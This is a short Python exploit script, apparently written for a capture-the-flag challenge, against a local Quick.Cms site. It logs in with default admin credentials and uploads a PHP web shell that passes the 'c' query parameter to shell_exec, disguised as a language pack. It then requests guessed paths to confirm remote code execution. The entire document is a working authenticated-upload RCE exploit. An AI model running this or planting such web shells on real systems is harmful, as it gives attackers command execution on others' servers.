#!/usr/bin/env python3
"""Upload a PHP 'language pack' to Quick.Cms languages-form → test RCE (attack_the_cms)."""
import requests, sys

BASE = "http://127.0.0.1:8765/"
CSRF = "c04c0d0201e69ecc606524f5dd07fbf8b9bc8a43492b9e4df290a9cbbf03ff8c"

s = requests.Session()
r = s.post(BASE + "admin.php?p=login",
           data={"sEmail": "contextgrave-admin@chal.sh", "sPass": "admin",
                 "bAcceptLicense": "1", "iAcceptLicense": "true"}, timeout=30)
assert "p=logout" in r.text, "login failed"

php = b"""<?php echo "PWNED:"; echo shell_exec($_GET['c'] ?? 'id'); ?>"""

name = sys.argv[1] if len(sys.argv) > 1 else "zh.php"
r = s.post(BASE + "admin.php?p=languages-form",
           data={"sCsrfToken": CSRF, "sName": "zz", "sOption": "save"},
           files={"aFile": (name, php, "application/x-php")},
           timeout=30)
print("upload:", r.status_code, len(r.text))
import re
for m in re.finditer(r'msg (error|ok)[^>]*>.{0,120}', r.text):
    print(m.group(0)[:140])
# look for where it went
for m in re.finditer(r'languages/[a-z0-9._-]+', r.text):
    print("PATH:", m.group(0))
# probe
for guess in ("languages/zz.php", "languages/zh.php", f"languages/{name}"):
    rr = s.get(BASE + guess + "?c=id", timeout=30)
    print(guess, rr.status_code, rr.text[:80])